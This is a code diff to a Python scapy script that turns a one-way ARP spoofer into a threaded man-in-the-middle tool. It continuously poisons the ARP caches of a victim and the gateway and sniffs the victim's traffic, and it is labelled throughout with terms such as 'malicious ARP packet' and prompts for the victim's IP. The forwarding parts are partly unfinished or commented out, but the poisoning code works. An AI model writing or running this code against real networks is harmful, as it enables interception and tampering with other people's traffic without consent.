@@ -3,9 +3,80 @@ import os
 import logging
 import re
 import sys
+import signal
 import threading
+import time
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)	# Delete scapy logging
 from scapy.all import *
+
+class arp_poison(threading.Thread):
+	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
+		threading.Thread.__init__(self)
+		self.myMAC = _myMAC
+		self.victimMAC = _victimMAC
+		self.myIP = _myIP
+		self.victimIP = _victimIP
+		self.gatewayIP = _gatewayIP
+		self.gatewayMAC = _gatewayMAC
+
+	def run(self):
+		while(True):
+				# Malicious ARP packet send			
+			sendp(Ether(dst=self.victimMAC, src=self.myMAC)/ARP(op=ARP.is_at, psrc=self.gatewayIP, pdst=self.victimIP, hwsrc=self.myMAC, hwdst=self.victimMAC), count=3)	
+			sendp(Ether(dst=self.gatewayMAC, src=self.myMAC)/ARP(op=ARP.is_at, psrc=self.victimIP, pdst=self.gatewayIP, hwsrc=self.myMAC, hwdst=self.gatewayMAC), count=3)
+			time.sleep(2)
+
+class to_gateway(threading.Thread):
+	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
+		threading.Thread.__init__(self)
+		self.myMAC = _myMAC
+		self.victimMAC = _victimMAC
+		self.myIP = _myIP
+		self.victimIP = _victimIP
+		self.gatewayIP = _gatewayIP
+		self.gatewayMAC = _gatewayMAC
+		self.ethlen = len(Ether())
+		self.iplen = len(IP())
+		self.tcplen = len(TCP())
+	
+	def run(self):
+		while(True):
+			sn = sniff(filter="ip and (ether src host " + self.victimMAC + ") and (ether dst host " + self.myMAC + ")", count=1)
+			print "************************Send Packet**************************"			
+			e = sn[0]
+			t = str(e)
+			eth = Ether(t[:self.ethlen])
+			ip = IP(t[self.ethlen:])
+			tcp = TCP(t[self.ethlen+self.iplen:])
+			print "dst : " + str(eth.dst)
+			print "src : " + str(eth.src)
+			print "dstip : " + str(ip.dst)
+			print "srcip : " + str(ip.src)
+			print sn.display()
+	
+			pkt = Ether(dst=self.gatewayMAC, src=self.myMAC)/IP(src=self.victimIP, dst=ip.dst)/tcp
+			print pkt.display()
+			
+
+class to_victim(threading.Thread):
+	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
+		threading.Thread.__init__(self)
+		self.myMAC = _myMAC
+		self.victimMAC = _victimMAC
+		self.myIP = _myIP
+		self.victimIP = _victimIP
+		self.gatewayIP = _gatewayIP
+		self.gatewayMAC = _gatewayMAC
+		self.ethlen = len(Ether())
+		self.iplen = len(IP())
+		self.tcplen = len(TCP())
+
+	def run(self):
+		while(True):
+			sn2 = sniff(filter="ip and (ether src host " + self.gatewayMAC + ") and (ip dst host " + self.victimIP + ")", count=1)
+			print "************************Recv Packet**************************"
+			print sn2.display()
+			sendp(sn2)
 
 def main():
 	victimIP = raw_input("[*] Please enter the victim's IP >> ")
@@ -24,6 +95,14 @@ def main():
 	victimMAC = ""
 	temp = ""
 	ok = re.findall("\("+str(victimIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)	# ARP table MAC address parsing
+	gatewayMAC = re.findall("\("+str(gatewayIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)
+	
+	if gatewayMAC:
+		gatewayMAC = gatewayMAC[0]
+	else:
+		print "Can't get gatewayMAC."
+		sys.exit(1)
+	
 	if ok:
 		victimMAC = ok[0]	# If exist
 
@@ -37,16 +116,18 @@ def main():
 		except Exception as e:
 			print "Error occured! Can't load the victimMAC. : " + str(e)
 			sys.exit(1)
-	
-	while(True):
-		try:
-			print "[*] Sending ARP Packet..."
-			print "[**] Ctrl+C to exit."
-			sendp(Ether(dst=victimMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=gatewayIP, pdst=victimIP, hwsrc=myMAC, hwdst=victimMAC), count=3)	# Malicious ARP packet send
-			time.sleep(5)		# 5sec term
-		except Exception as e:
-			print "Error occured! Can't send a packet. : " + str(e)
-			sys.exit(1)
 
+	tArp = arp_poison(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
+	tGateway = to_gateway(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
+	tVictim = to_victim(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
+
+	tArp.start()
+	tGateway.start()
+#	tVictim.start()
+
+	tArp.join()
+	tGateway.join()	
+#	tVictim.start()
+	
 if __name__ == '__main__':
 	main()
